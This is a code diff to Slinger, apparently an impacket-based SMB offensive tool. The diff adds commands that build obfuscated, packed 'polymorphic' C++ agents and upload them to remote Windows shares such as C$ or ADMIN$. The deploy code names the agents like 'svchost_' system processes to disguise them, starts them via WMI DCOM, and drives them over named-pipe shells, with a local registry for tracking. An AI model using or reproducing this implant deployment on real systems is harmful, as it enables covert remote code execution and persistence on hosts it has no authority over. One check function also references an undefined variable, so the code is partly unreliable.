@@ -8,14 +8,25 @@ from slingerpkg.lib.secrets import secrets
 from slingerpkg.lib.eventlog import EventLog
 from slingerpkg.lib.named_pipes import NamedPipeEnumerator
 from slingerpkg.lib.wmi_namedpipe import WMINamedPipeExec
+from slingerpkg.lib.named_pipe_client import NamedPipeClientWin32, NamedPipeClientCtypes
 from slingerpkg.utils.printlib import *
 from slingerpkg.utils.common import *
 from slingerpkg.lib.dcetransport import DCETransport
+
+# Standard library imports used throughout
 import datetime
+import json
+import os
+import struct
+import sys
+import traceback
+from pathlib import Path
+from tabulate import tabulate
+
+# Impacket imports
 from impacket import smbconnection
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 import slingerpkg.var.config as config
-import traceback
 
 dialect_mapping = {
     0x02FF: "SMB 1.0",
@@ -178,15 +189,15 @@ class SlingerClient(
 
         except Exception as e:
             print_debug(str(e), sys.exc_info())
-        
+
         # Cleanup WMI connections if they exist
         try:
-            if hasattr(self, '_wmi_services') and hasattr(self, 'cleanup_wmi'):
+            if hasattr(self, "_wmi_services") and hasattr(self, "cleanup_wmi"):
                 print_debug("Cleaning up WMI connections...")
                 self.cleanup_wmi()
         except Exception as e:
             print_debug(f"WMI cleanup error: {e}")
-        
+
         self.conn = None
 
     def is_connected_to_remote_share(self):
@@ -213,6 +224,40 @@ class SlingerClient(
 
         print_log(f"Logged in: {self.is_logged_in}")
         print_log(f"Total time of session: {datetime.datetime.now() - self.session_start_time}")
+
+    def history_handler(self, args):
+        """Display command history from the slinger history file"""
+        try:
+            from slingerpkg.utils.common import get_config_value
+            from slingerpkg.utils.printlib import print_log, print_bad, print_info
+
+            # Get history file location from config
+            hist_file = os.path.expanduser(get_config_value("History_File"))
+
+            # Check if history file exists
+            if not os.path.exists(hist_file):
+                print_bad(f"History file not found: {hist_file}")
+                return
+
+            # Read history file
+            with open(hist_file, "r") as f:
+                lines = f.readlines()
+
+            # Get the number of lines to display (default 15)
+            num_lines = args.n if hasattr(args, "n") else 15
+
+            # Get last N lines
+            history_lines = lines[-num_lines:]
+
+            # Display history
+            print_info(f"Last {len(history_lines)} commands:")
+            for i, line in enumerate(history_lines, start=len(lines) - len(history_lines) + 1):
+                print_log(f"{i:4d}  {line.rstrip()}")
+
+        except Exception as e:
+            from slingerpkg.utils.printlib import print_bad
+
+            print_bad(f"Failed to read history: {e}")
 
     def who(self, args=None):
         """
@@ -549,7 +594,7 @@ class SlingerClient(
             domain = self.domain
             ntlm_hash = self.ntlm_hash
             current_share = self.share if hasattr(self, "share") else None
-            current_path = self.pwd() if current_share else None
+            current_path = getattr(self, "current_path", None) if current_share else None
 
             # Close existing connection
             try:
@@ -567,28 +612,2114 @@ class SlingerClient(
                 self.conn.login(username, password, domain, lmhash, nthash)
             else:
                 self.conn.login(username, password, domain)
-            self.setup_dce_transport()
-            print_good("Successfully reconnected to the server")
 
-            # If we were connected to a share, reconnect
+            # Try to reconnect to the original share if we had one
             if current_share:
                 try:
-                    self.use(f"use {current_share}")
-                    print_good(f"Reconnected to share {current_share}")
+                    self.conn.connectTree(current_share)
+                    self.share = current_share
+                    self.is_connected_to_share = True
+                    print_good(f"Reconnected to share: {current_share}")
 
-                    # Try to restore path
-                    if current_path and current_path != "\\":
+                    # Try to change back to the original path
+                    if current_path and current_path != "/":
                         try:
-                            self.cd(f"cd {current_path}")
-                            print_good(f"Restored path to {current_path}")
+                            self.cd_no_output(current_path)
+                            print_info(
+                                f"Current directory: {getattr(self, 'current_path', 'Unknown')}"
+                            )
                         except:
-                            print_warning(f"Could not restore path to {current_path}")
+                            print_warning(f"Could not change back to original path: {current_path}")
+                            print_info(
+                                f"Current directory: {getattr(self, 'current_path', 'Unknown')}"
+                            )
+
                 except Exception as e:
-                    print_warning(f"Could not reconnect to share {current_share}: {e}")
+                    print_bad(f"Failed to reconnect to share {current_share}: {e}")
+                    self.is_connected_to_share = False
+            else:
+                print_good("Reconnected to server")
 
         except Exception as e:
             print_bad(f"Failed to reconnect: {e}")
+
+    def agent_handler(self, args):
+        """Handle agent commands for cooperative agent building"""
+        try:
+            # Import the agent builder
+
+            print_debug("Starting agent_handler execution")
+            print_debug(f"Current file: {__file__}")
+            print_debug(f"Python path: {sys.path}")
+
+            # Try direct import first (since we copied the file to slingerpkg/lib)
+            try:
+                from slingerpkg.lib.cooperative_agent import build_cooperative_agent, AgentBuilder
+
+                print_debug("Successfully imported from slingerpkg.lib.cooperative_agent")
+            except ImportError as import_error:
+                print_debug(f"Direct import failed: {import_error}")
+                print_debug("Attempting fallback import path")
+
+                # Fallback: Add lib directory to path for cooperative_agent import
+                lib_path = os.path.join(
+                    os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "lib"
+                )
+                print_debug(f"Trying lib path: {lib_path}")
+                if lib_path not in sys.path:
+                    sys.path.insert(0, lib_path)
+
+                from cooperative_agent import build_cooperative_agent, AgentBuilder
+
+                print_debug("Successfully imported from fallback path")
+
+            # Handle case where no subcommand was provided
+            if args.agent_command is None:
+                # Print the agent help menu
+                print_info("Slinger Agent Management")
+                print_log("")
+                print_log("Available Commands:")
+                print_log("  build    - Build polymorphic C++ agents")
+                print_log("  info     - Show builder configuration and status")
+                print_log("  deploy   - Deploy agent to target system")
+                print_log("  list     - List all deployed agents")
+                print_log("  use      - Connect to deployed agent")
+                print_log("  rename   - Rename deployed agent")
+                print_log("  check    - Check if agent is running")
+                print_log("  kill     - Terminate running agent")
+                print_log("  rm       - Remove agent from registry")
+                print_log("  update   - Update agent metadata")
+                print_log("  start    - Start stopped agent")
+                print_log("")
+                print_info("Use 'agent <command> --help' for detailed command help")
+                return
+
+            if args.agent_command == "build":
+                # Handle dry run mode
+                if hasattr(args, "dry_run") and args.dry_run:
+                    print_info("Checking build readiness (dry run)...")
+
+                    # Get the project root directory - go up from slingerpkg/lib/slingerclient.py
+                    current_file_dir = os.path.dirname(__file__)  # slingerpkg/lib
+                    slingerpkg_dir = os.path.dirname(current_file_dir)  # slingerpkg
+                    src_dir = os.path.dirname(slingerpkg_dir)  # src
+                    base_path = os.path.dirname(src_dir)  # project root
+
+                    print_debug(f"Calculated base_path for dry-run: {base_path}")
+                    print_debug(f"Expected lib path: {os.path.join(base_path, 'lib')}")
+
+                    builder = AgentBuilder(base_path)
+                    deps = builder.check_build_dependencies()
+
+                    print_log(f"Architecture: {args.arch}")
+                    print_log(
+                        f"Encryption: {'Enabled' if args.encryption and not args.no_encryption else 'Disabled'}"
+                    )
+                    print_log(f"Debug mode: {'Enabled' if args.debug else 'Disabled'}")
+
+                    if deps.get("cmake", False) and deps.get("cpp_compiler", False):
+                        print_good("\n✓ All dependencies available - ready to build")
+                        print_info("Run without --dry-run to actually build the agent")
+                    else:
+                        print_bad("\n✗ Missing dependencies:")
+                        if not deps.get("cmake", False):
+                            print_log("  ✗ CMake not found")
+                        if not deps.get("cpp_compiler", False):
+                            print_log("  ✗ C++ compiler not found")
+                    return
+
+                print_info("Building cooperative agent...")
+
+                # Show pipe name configuration
+                custom_pipe = getattr(args, "pipe", None)
+                if custom_pipe:
+                    print_info(f"Using custom pipe name: {custom_pipe}")
+                else:
+                    print_info("Using time-based random pipe name (determined at runtime)")
+
+                # Handle encryption settings
+                encryption = args.encryption and not args.no_encryption
+                print_debug(f"Encryption enabled: {encryption}")
+
+                # Determine output directory
+                output_dir = (
+                    args.output_dir if hasattr(args, "output_dir") and args.output_dir else None
+                )
+                print_debug(f"Output directory: {output_dir}")
+
+                # Get the project root directory for building - same calculation as dry-run
+                current_file_dir = os.path.dirname(__file__)  # slingerpkg/lib
+                slingerpkg_dir = os.path.dirname(current_file_dir)  # slingerpkg
+                src_dir = os.path.dirname(slingerpkg_dir)  # src
+                base_path = os.path.dirname(src_dir)  # project root
+
+                print_debug(f"Calculated base_path for build: {base_path}")
+                print_debug(
+                    f"Template directory: {os.path.join(base_path, 'lib', 'agent_templates')}"
+                )
+
+                # Build the agent(s)
+                passphrase_arg = getattr(args, "passphrase", None)
+                obfuscate_arg = getattr(args, "obfuscate", False)
+                upx_arg = getattr(args, "upx", None)
+                print_debug(
+                    f"Starting build with arch={args.arch}, encryption={encryption}, debug={args.debug}, passphrase={'<set>' if passphrase_arg else 'None'}, obfuscate={obfuscate_arg}, upx={upx_arg}"
+                )
+                built_agents = build_cooperative_agent(
+                    arch=args.arch,
+                    encryption=encryption,
+                    debug=args.debug,
+                    base_path=base_path,
+                    custom_pipe_name=getattr(args, "pipe", None),
+                    passphrase=passphrase_arg,
+                    obfuscate=obfuscate_arg,
+                    upx_path=upx_arg,
+                )
+
+                if built_agents:
+                    print_good(f"Successfully built {len(built_agents)} agent(s):")
+                    for agent_path in built_agents:
+                        file_size = os.path.getsize(agent_path) if os.path.exists(agent_path) else 0
+                        print_log(f"  {agent_path} ({file_size:,} bytes)")
+
+                    # Show pipe name guidance
+                    if getattr(args, "pipe", None):
+                        print_info(f"\n💡 Agents built with custom pipe name: {args.pipe}")
+                        print_info(f"   Pipe name automatically used during deployment")
+                        print_info(f"   Deploy with: agent deploy <agent.exe> --path \\\\ --start")
+                    else:
+                        print_info("\n💡 These agents use time-based random pipe names")
+                        print_info("   The actual pipe name will be determined when the agent runs")
+                        print_info("   Deploy with: agent deploy <agent.exe> --path \\\\ --start")
+
+                    print_info(
+                        "   Use 'agent use <id>' to connect (pipe name tracked automatically)"
+                    )
+
+                else:
+                    print_bad("Failed to build agents. Check build dependencies.")
+                    print_info("Required: CMake, C++ compiler (MSVC/MinGW)")
+
+            elif args.agent_command == "info":
+                print_info("Cooperative Agent Builder Information")
+
+                # Get the project root directory - same calculation as build
+                current_file_dir = os.path.dirname(__file__)  # slingerpkg/lib
+                slingerpkg_dir = os.path.dirname(current_file_dir)  # slingerpkg
+                src_dir = os.path.dirname(slingerpkg_dir)  # src
+                base_path = os.path.dirname(src_dir)  # project root
+
+                print_debug(f"Calculated base_path for info: {base_path}")
+
+                builder = AgentBuilder(base_path)
+                info = builder.get_build_info()
+
+                print_log(f"Template Directory: {info['template_dir']}")
+                print_log(f"Build Directory: {info['build_dir']}")
+                print_log(f"Output Directory: {info['output_dir']}")
+                print_log(f"Supported Architectures: {', '.join(info['supported_architectures'])}")
+
+                print_info("\nBuild Dependencies:")
+                deps = info["dependencies"]
+                cmake_status = "✓" if deps["cmake_available"] else "✗"
+                compiler_status = "✓" if deps["cpp_compiler_available"] else "✗"
+                print_log(
+                    f"  {cmake_status} CMake: {'Available' if deps['cmake_available'] else 'Not found'}"
+                )
+                print_log(
+                    f"  {compiler_status} C++ Compiler: {deps['compiler_found'] if deps['cpp_compiler_available'] else 'Not found'}"
+                )
+
+                print_info("\nTemplate Files:")
+                for template in info["template_files"]:
+                    print_log(f"  ✓ {template}")
+
+                print_info("\nCurrent Build Configuration:")
+                print_log(f"  Encryption Seed: {info['encryption_seed']}")
+                print_log(f"  Layout Seed: {info['layout_seed']}")
+
+                # Show built agents and deployment status
+                self._show_built_agents_status(info["output_dir"])
+
+                # Show build readiness
+                if deps["cmake_available"] and deps["cpp_compiler_available"]:
+                    print_good("\n✓ System ready for agent building")
+                else:
+                    print_warning("\n⚠ Missing build dependencies - install CMake and C++ compiler")
+
+            elif args.agent_command == "deploy":
+                self.agent_deploy_handler(args)
+
+            elif args.agent_command == "list":
+                self.agent_list_handler(args)
+
+            elif args.agent_command == "use":
+                self.agent_use_handler(args)
+
+            elif args.agent_command == "rename":
+                self.agent_rename_handler(args)
+
+            elif args.agent_command == "check":
+                self.agent_check_handler(args)
+
+            elif args.agent_command == "kill":
+                self.agent_kill_handler(args)
+
+            elif args.agent_command == "rm":
+                self.agent_rm_handler(args)
+
+            elif args.agent_command == "reset":
+                self.agent_reset_handler(args)
+
+            elif args.agent_command == "update":
+                self.agent_update_handler(args)
+
+            elif args.agent_command == "start":
+                self.agent_restart_handler(args)
+
+            else:
+                print_bad(f"Unknown agent command: {args.agent_command}")
+                print_info(
+                    "Available commands: build, info, deploy, list, use, rename, check, kill, rm, reset, update, start"
+                )
+
+        except ImportError as e:
+            print_bad(f"Agent builder not available: {e}")
+            print_debug(f"ImportError details: {e}")
+            print_debug(f"Current working directory: {os.getcwd()}")
+            print_debug(f"__file__ path: {__file__}")
+            print_info("Ensure cooperative_agent.py is in lib/ directory")
+        except Exception as e:
+            print_bad(f"Agent command failed: {e}")
+            print_debug(f"Exception type: {type(e).__name__}")
+            print_debug(f"Exception details: {e}")
+            if hasattr(args, "debug") and args.debug:
+
+                print_debug("Full traceback:")
+                traceback.print_exc()
+
+    def agent_deploy_handler(self, args):
+        """Handle agent deployment to target system"""
+        try:
+            import random
+            import string
+            from slingerpkg.utils.printlib import (
+                print_info,
+                print_good,
+                print_bad,
+                print_warning,
+                print_log,
+                print_debug,
+                print_verbose,
+            )
+
+            # Check prerequisites
+            if not self.is_logged_in:
+                print_bad("Not logged in. Please authenticate first.")
+                return
+
+            if not self.is_connected_to_share:
+                print_bad("Not connected to a share. Use 'connect <share>' first.")
+                print_info("Example: connect C$")
+                return
+
+            # Validate agent file exists
+            if not os.path.exists(args.agent_path):
+                print_bad(f"Agent file not found: {args.agent_path}")
+                return
+
+            # Generate agent name if not provided
+            if args.name:
+                agent_name = args.name
+                if not agent_name.endswith(".exe"):
+                    agent_name += ".exe"
+            else:
+                # Generate random name that looks like a system process
+                agent_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
+                agent_name = f"svchost_{agent_id}.exe"
+
+            print_info(f"Deploying agent: {os.path.basename(args.agent_path)}")
+            print_info(f"Current share: {self.share}")
+            print_info(f"Target path: {args.path}")
+            print_info(f"Agent name: {agent_name}")
+
+            # Use existing upload functionality - args.path is relative to current share
+            target_path = args.path.rstrip("\\")
+            if target_path and not target_path.endswith("\\"):
+                remote_path = f"{target_path}\\{agent_name}"
+            else:
+                remote_path = agent_name
+
+            print_info(f"Uploading to: {self.share}\\{remote_path}")
+
+            try:
+                # Use the existing upload method from smblib
+                self.upload(args.agent_path, remote_path)
+                print_good(f"✓ Agent uploaded successfully")
+
+                # Start agent if requested
+                if args.start:
+                    print_info("Starting agent via WMI DCOM...")
+
+                    # Resolve share to disk path FIRST for proper path construction
+                    share_disk_path = self._resolve_share_path(self.share)
+
+                    # Build full execution path using resolved share path
+                    if share_disk_path:
+                        # Use resolved disk path (e.g., ADMIN$ -> C:\Windows)
+                        # Strip leading backslash from remote_path to avoid C:\Windows\\file.exe
+                        clean_remote = remote_path.lstrip("\\")
+                        full_path = f"{share_disk_path}\\{clean_remote}"
+                    elif self.share.endswith("$") and len(self.share) == 2:
+                        # Fallback for drive shares like C$, D$ if resolution failed
+                        drive = self.share[:-1] + ":"
+                        clean_remote = remote_path.lstrip("\\")
+                        full_path = f"{drive}\\{clean_remote}"
+                    else:
+                        # Last resort fallback
+                        print_warning(
+                            f"Could not resolve share path for '{self.share}', using fallback"
+                        )
+                        clean_remote = remote_path.lstrip("\\")
+                        full_path = f"C:\\{clean_remote}"
+
+                    # Normalize path - replace any double backslashes and ensure single backslashes
+                    full_path = full_path.replace("\\\\", "\\")  # Clean up double slashes
+
+                    try:
+                        # Use existing WMI execution capability
+                        # Start agent directly (not using start /b to capture PID)
+                        command = f'"{full_path}"'
+                        print_verbose(f"Executing: {command}")
+
+                        result = self.execute_wmi_command(command, capture_output=False, timeout=10)
+
+                        if result.get("success", False):
+                            print_good("✓ Agent started successfully")
+
+                            # Get process ID from WMI execution result (this is the parent process)
+                            process_id = result.get("process_id")
+                            if process_id:
+                                print_good(f"✓ Agent PPID: {process_id} (parent process)")
+
+                            # Store agent info for tracking
+                            agent_id = agent_name.replace(".exe", "")
+
+                            # Determine pipe name: --pipe flag > build registry > discovery placeholder
+                            build_info = self._lookup_build_registry(args.agent_path)
+                            if hasattr(args, "pipe") and args.pipe:
+                                pipe_name = args.pipe
+                                pipe_source = "flag"
+                            elif build_info and build_info.get("pipe_name"):
+                                pipe_name = build_info["pipe_name"]
+                                pipe_source = "registry"
+                            else:
+                                # For agents without known pipe names, use placeholder that will be discovered later
+                                pipe_name = (
+                                    f"slinger_agent_{agent_id}"  # placeholder, will be discovered
+                                )
+                                pipe_source = "placeholder"
+
+                            # Get XOR key from build registry (encryption_seed & 0xFF)
+                            xor_key = None
+                            if build_info and "encryption_seed" in build_info:
+                                xor_key = build_info["encryption_seed"] & 0xFF
+
+                            # Get passphrase and auth status from build registry
+                            passphrase = None
+                            auth_enabled = False
+                            if build_info:
+                                passphrase = build_info.get("passphrase")
+                                auth_enabled = build_info.get("auth_enabled", False)
+
+                            # share_disk_path already resolved above for path construction
+
+                            agent_info = {
+                                "id": agent_id,
+                                "name": agent_name,
+                                "host": self.host,
+                                "path": full_path,
+                                "share_name": self.share,
+                                "share_path": share_disk_path,
+                                "pipe_name": pipe_name,
+                                "xor_key": xor_key,
+                                "passphrase": passphrase,
+                                "auth_enabled": auth_enabled,
+                                "process_id": process_id,
+                                "deployed_at": str(datetime.datetime.now()),
+                                "status": "running",
+                                "on_disk": "Present",  # Just uploaded successfully
+                                "last_checked": None,
+                            }
+
+                            # Save agent info to local registry
+                            self._save_agent_info(agent_info)
+
+                            print_good(f"✓ Agent deployed with ID: {agent_id}")
+                            print_info(f"Agent process: {agent_name}")
+
+                            # Show pipe name source
+                            if pipe_source == "flag":
+                                print_info(f"Pipe name: {pipe_name} (from --pipe flag)")
+                            elif pipe_source == "registry":
+                                print_info(f"Pipe name: {pipe_name} (from build registry)")
+                            else:
+                                print_info(
+                                    f"Pipe name: {pipe_name} (placeholder - will be discovered)"
+                                )
+
+                            print_info(f"Named pipe: \\\\{self.host}\\pipe\\{pipe_name}")
+                            print_warning(f"Use 'agent use {agent_id}' to interact with this agent")
+                            print_info(f"Use 'agent list' to see all deployed agents")
+                        else:
+                            print_bad(
+                                f"Failed to start agent: {result.get('error', 'Unknown error')}"
+                            )
+                            print_info("Agent uploaded but not started - you may start it manually")
+
+                    except Exception as e:
+                        print_warning(f"Agent uploaded but failed to start: {e}")
+                        print_info("You may need to start it manually or check WMI connectivity")
+
+            except Exception as e:
+                print_bad(f"Failed to upload agent: {e}")
+                return
+
+        except Exception as e:
+            print_bad(f"Agent deployment failed: {e}")
+            print_debug(f"Exception details: {e}")
+
+    def _resolve_share_path(self, share_name):
+        """Resolve share name to its disk path using SMB share enumeration
+
+        Args:
+            share_name: Share name (e.g., "C$", "NETLOGON", "SYSVOL")
+
+        Returns:
+            Disk path (e.g., "C:\\", "C:\\Windows\\SYSVOL\\sysvol\\htb.local\\SCRIPTS") or None
+        """
+        try:
+            from slingerpkg.utils.printlib import print_debug
+
+            # Query all shares and find matching one
+            shares = self.list_shares(ret=True, echo=False)
+
+            for share_info in shares:
+                if share_info["name"].upper() == share_name.upper():
+                    disk_path = share_info["path"]
+                    print_debug(f"Resolved share '{share_name}' to disk path: {disk_path}")
+                    return disk_path
+
+            print_debug(f"Could not resolve share '{share_name}' to disk path")
+            return None
+
+        except Exception as e:
+            print_debug(f"Failed to resolve share path: {e}")
+            return None
+
+    def _save_agent_info(self, agent_info):
+        """Save agent information to local registry file"""
+        try:
+
+            # Create agents directory in user's home
+            agents_dir = Path.home() / ".slinger" / "agents"
+            agents_dir.mkdir(parents=True, exist_ok=True)
+
+            registry_file = agents_dir / "deployed_agents.json"
+
+            # Load existing registry
+            if registry_file.exists():
+                with open(registry_file, "r") as f:
+                    registry = json.load(f)
+            else:
+                registry = {}
+
+            # Add new agent
+            registry[agent_info["id"]] = agent_info
+
+            # Save updated registry
+            with open(registry_file, "w") as f:
+                json.dump(registry, f, indent=2)
+
+            print_debug(f"Saved agent info to {registry_file}")
+
+        except Exception as e:
+            print_debug(f"Failed to save agent info: {e}")
+
+    def _load_agent_registry(self):
+        """Load deployed agents registry"""
+        try:
+
+            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"
+
+            if registry_file.exists():
+                with open(registry_file, "r") as f:
+                    return json.load(f)
+            return {}
+
+        except Exception as e:
+            print_debug(f"Failed to load agent registry: {e}")
+            return {}
+
+    def agent_list_handler(self, args):
+        """Handle agent list command"""
+        try:
+            from slingerpkg.utils.printlib import (
+                print_info,
+                print_good,
+                print_bad,
+                print_log,
+                print_debug,
+            )
+            from tabulate import tabulate
+
+            # Handle delete operation if --del specified
+            if hasattr(args, "delete_agent") and args.delete_agent:
+                if args.delete_agent.lower() == "all":
+                    return self._delete_all_agents_from_registry()
+                return self._delete_agent_from_registry(args.delete_agent)
+
+            registry = self._load_agent_registry()
+
+            if not registry:
+                print_info("No deployed agents found")
+                print_info("Use 'agent deploy' to deploy an agent")
+                return
+
+            # Filter by host if specified
+            filtered_agents = registry
+            if hasattr(args, "host") and args.host:
+                filtered_agents = {k: v for k, v in registry.items() if v.get("host") == args.host}
+
+            if not filtered_agents:
+                print_info(f"No agents found for host: {args.host}")
+                return
+
+            # Get output format
+            output_format = getattr(args, "format", "table")
+
+            if output_format == "json":
+                # JSON output
+                import json
+
+                print(json.dumps(filtered_agents, indent=2))
+                return
+            elif output_format == "list":
+                # List output - one agent per block
+                print_info(f"Deployed Agents ({len(filtered_agents)} found):")
+                print_log("")
+                for agent_id, info in filtered_agents.items():
+                    print_log(f"Agent ID: {agent_id}")
+                    print_log(f"  Host: {info.get('host', 'Unknown')}")
+                    print_log(f"  Name: {info.get('name', 'Unknown')}")
+                    print_log(f"  Path: {info.get('path', 'Unknown')}")
+                    print_log(f"  PPID: {info.get('process_id', 'Unknown')}")
+                    print_log(f"  Status: {info.get('status', 'Unknown')}")
+                    print_log(f"  On Disk: {info.get('on_disk', 'Unknown')}")
+                    print_log(f"  Deployed At: {info.get('deployed_at', 'Unknown')[:19]}")
+                    last_checked = info.get("last_checked")
+                    if last_checked:
+                        print_log(f"  Last Checked: {last_checked[:19]}")
+                    else:
+                        print_log(f"  Last Checked: Never")
+                    print_log("")
+            else:
+                # Table output (default)
+                headers = [
+                    "Agent ID",
+                    "Host",
+                    "Agent Name",
+                    "Path",
+                    "PPID",
+                    "Status",
+                    "On Disk",
+                    "Deployed At",
+                    "Last Checked",
+                ]
+                table_data = []
+
+                for agent_id, info in filtered_agents.items():
+                    ppid = info.get("process_id", "Unknown")
+                    last_checked = info.get("last_checked")
+                    if last_checked:
+                        last_checked_str = last_checked[:19]
+                    else:
+                        last_checked_str = "Never"
+
+                    table_data.append(
+                        [
+                            agent_id,
+                            info.get("host", "Unknown"),
+                            info.get("name", "Unknown"),
+                            info.get("path", "Unknown"),
+                            ppid,
+                            info.get("status", "Unknown"),
+                            info.get("on_disk", "Unknown"),
+                            info.get("deployed_at", "Unknown")[:19],  # Trim timestamp
+                            last_checked_str,
+                        ]
+                    )
+
+                print_info(f"Deployed Agents ({len(filtered_agents)} found):")
+                print_log(tabulate(table_data, headers=headers, tablefmt="grid"))
+
+            print_info("Commands:")
+            print_log("  agent use <id>           - Interact with agent")
+            print_log("  agent list --host <host> - Filter by host")
+            print_log("  agent list -f json       - Output as JSON")
+            print_log("  agent list --del <id>    - Remove agent from registry")
+            print_log("  agent list --del all     - Remove all agents from registry")
+
+        except Exception as e:
+            print_bad(f"Failed to list agents: {e}")
+            print_debug(f"Exception details: {e}")
+
+    def agent_use_handler(self, args):
+        """Handle agent interaction via named pipe"""
+        try:
+            from slingerpkg.utils.printlib import (
+                print_info,
+                print_good,
+                print_bad,
+                print_warning,
+                print_log,
+                print_debug,
+            )
+            import time
+
+            # Load agent registry to get agent info
+            registry = self._load_agent_registry()
+            agent_info = registry.get(args.agent_id)
+
+            if not agent_info:
+                print_bad(f"Agent '{args.agent_id}' not found in registry")
+                print_info("Use 'agent list' to see deployed agents")
+                return
+
+            print_info(f"Agent Information:")
+            print_log(f"  ID: {agent_info['id']}")
+            print_log(f"  Host: {agent_info['host']}")
+            print_log(f"  Name: {agent_info['name']}")
+            print_log(f"  Path: {agent_info['path']}")
+            print_log(f"  Pipe: \\\\{agent_info['host']}\\pipe\\{agent_info['pipe_name']}")
+            if agent_info.get("process_id"):
+                print_log(f"  PPID: {agent_info['process_id']} (parent process)")
+            else:
+                print_log(f"  PPID: Unknown")
+
+            print_info(f"Connecting to agent: {args.agent_id}")
+            print_info(f"Timeout: {args.timeout} seconds")
+
+            # Check if we're connected to the same host
+            if self.host != agent_info["host"]:
+                print_warning(f"Current session is connected to {self.host}")
+                print_warning(f"Agent is on {agent_info['host']}")
+                print_info("You may need to connect to the agent's host first")
+
+            # Start interactive agent shell
+            print_good(f"Starting interactive session with agent {args.agent_id}")
+            print_info(f"Pipe Name: {agent_info['pipe_name']}")
+            no_colors = getattr(args, "no_colors", False)
+            self._start_agent_shell(agent_info, args.timeout, no_colors=no_colors)
+
+        except Exception as e:
+            print_bad(f"Agent interaction failed: {e}")
+            print_debug(f"Exception details: {e}")
+
+    def agent_rename_handler(self, args):
+        """Handle agent renaming in registry"""
+        try:
+            from slingerpkg.utils.printlib import print_info, print_good, print_bad
+
+            # Load agent registry
+            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"
+
+            if not registry_file.exists():
+                print_bad("No deployed agents found")
+                return
+
+            with open(registry_file, "r") as f:
+                agents = json.load(f)
+
+            # Check if old agent exists
+            if args.old not in agents:
+                print_bad(f"Agent '{args.old}' not found in registry")
+                return
+
+            # Check if new name already exists
+            if args.new in agents:
+                print_bad(f"Agent '{args.new}' already exists in registry")
+                return
+
+            # Rename the agent
+            agents[args.new] = agents[args.old]
+            agents[args.new]["id"] = args.new
+            del agents[args.old]
+
+            # Save updated registry
+            with open(registry_file, "w") as f:
+                json.dump(agents, f, indent=2)
+
+            print_good(f"Agent renamed from '{args.old}' to '{args.new}'")
+
+        except Exception as e:
+            print_bad(f"Failed to rename agent: {e}")
+
+    def agent_check_handler(self, args):
+        """Handle agent process status check via WMI"""
+        try:
+            from slingerpkg.utils.printlib import (
+                print_info,
+                print_good,
+                print_bad,
+                print_warning,
+                print_debug,
+            )
+
+            # Ensure we have a share connection for WMI operations
+            if not self.check_if_connected():
+                print_bad("Not connected to a share. Please connect to a share first.")
+                print_info("Example: use C$")
+                return
+
+            # Load agent registry
+            registry_file = Path.home() / ".slinger" / "agents" / "deployed_agents.json"
+
+            if not registry_file.exists():
+                print_bad("No deployed agents found")
+                return
+
+            with open(registry_file, "r") as f:
+                agents = json.load(f)
+
+            # Check if agent exists
+            if args.agent_id not in agents:
+                print_bad(f"Agent '{args.agent_id}' not found in registry")
+                return
+
+            agent_info = agents[args.agent_id]
+            ppid = agent_info.get("process_id")
+
+            if not ppid:
+                print_warning(f"No PPID recorded for agent '{args.agent_id}'")
+                return
+
+            print_info(f"Checking agent '{args.agent_id}' (PPID: {ppid})")
+
+            # Use WMI to check if the process and its children exist
+            try:
+                # Query for child processes of the agent's PPID using direct WMI API
+                child_query = (
+                    f"SELECT ProcessId, Name FROM Win32_Process WHERE ParentProcessId = {ppid}"
+                )
+
+                print_debug(f"Executing WMI query: {child_query}")
+
+                # Use the WMI query API directly instead of stdout capture
+                try:
+                    results = self._run_wql_query(child_query, namespace="root/cimv2")
+                    result_count = len(results) if results else 0
+                    agent_alive = result_count > 0
+
+                    print_debug(f"WMI query returned {result_count} result(s)")
+                except Exception as query_error:
+                    print_debug(f"WMI query exception: {query_error}")
+                    result_count = 0
+                    agent_alive = False
+
+                if agent_alive:
+                    print_good(
+                        f"✓ Agent process tree is running (PPID: {ppid}) - found {result_count} child process(es)"
+                    )
+
+                    # Update agent status to alive if it was previously marked as dead
+                    if agents[args.agent_id].get("status") == "dead":
+                        agents[args.agent_id]["status"] = "alive"
+
+                elif result_count == 0:
+                    print_bad(f"✗ Agent process not found (PPID: {ppid})")
+                    print_warning(f"Process has terminated - updating status to 'dead'")
+
+                    # Update agent status to dead
+                    agents[args.agent_id]["status"] = "dead"
+
+                else:
+                    print_warning(f"Unable to determine agent status from WMI output")
+                    print_debug(f"Could not parse WMI results - agent status unchanged")
+                    # Show what we actually got for debugging
+                    if stdout_output:
+                        print_debug(f"Raw output: {stdout_output}")
+
+                # Check if agent file exists on disk
+                print_info("Verifying agent file on disk...")
+                agent_path = agent_info.get("path")
+                agent_name = agent_info.get("name")
+                share_path = agent_info.get("share_path")
+
+                if agent_path:
+                    # Use wmiexec dcom to check if file exists
+                    try:
+                        dir_command = f'dir "{agent_path}"'
+                        print_debug(f"Checking disk with: {dir_command}")
+
+                        # Use default temp_dir (None) - execute_wmi_command will use current session share
+                        # This is share-aware automatically based on where we're currently connected
+                        result = self.execute_wmi_command(
+                            command=dir_command, capture_output=True, timeout=10, shell="cmd"
+                        )
+
+                        if result.get("success"):
+                            output = result.get("output", "")
+                            # Case-insensitive check for agent filename in output
+                            if agent_name.lower() in output.lower():
+                                print_good(f"✓ Agent file found on disk: {agent_path}")
+                                agents[args.agent_id]["on_disk"] = "Present"
+                            else:
+                                print_warning(f"✗ Agent file not found on disk: {agent_path}")
+                                agents[args.agent_id]["on_disk"] = "Missing"
+                        else:
+                            print_warning(f"Could not verify file on disk: {result.get('error')}")
+                            agents[args.agent_id]["on_disk"] = "Unknown"
+
+                    except Exception as disk_error:
+                        print_warning(f"Failed to check disk: {disk_error}")
+                        agents[args.agent_id]["on_disk"] = "Unknown"
+                else:
+                    print_warning("No path recorded for agent - cannot verify disk status")
+                    agents[args.agent_id]["on_disk"] = "Unknown"
+
+                # Update last_checked timestamp
+                agents[args.agent_id]["last_checked"] = str(datetime.datetime.now())
+
+                # Save updated registry
+                with open(registry_file, "w") as f:
+                    json.dump(agents, f, indent=2)
+                print_good(f"✓ Registry updated for agent '{args.agent_id}'")
+
+            except Exception as e:
+                print_bad(f"WMI query failed: {e}")
+                print_debug(f"Exception details: {e}")
+                print_info("Unable to verify agent status")
+
+        except Exception as e:
+            print_bad(f"Failed to check agent: {e}")
+
